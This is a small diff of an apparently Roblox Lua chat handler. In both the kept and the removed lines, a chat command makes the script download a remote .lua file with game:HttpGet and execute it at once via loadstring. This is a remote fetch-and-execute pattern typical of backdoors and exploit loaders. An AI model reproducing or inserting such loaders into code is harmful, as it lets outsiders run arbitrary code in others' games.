@@ -57,12 +57,7 @@ local function Connect(Obj)
       SpacePercent = SpacePercent:gsub(" ", "%%20")
       loadstring(game:HttpGet(Script_PH .. SpacePercent .. ".lua"))()
     end
-    
-    if Chat:lower():sub(1,7) == ("/e $ls ") then
-      local SpacePercent = string.sub(Chat, 8)
-      SpacePercent = SpacePercent:gsub(" ", "%%20")
-      loadstring(game:HttpGet(Script_PH .. SpacePercent .. ".lua"))()
-    end
+
 end)
 
 end
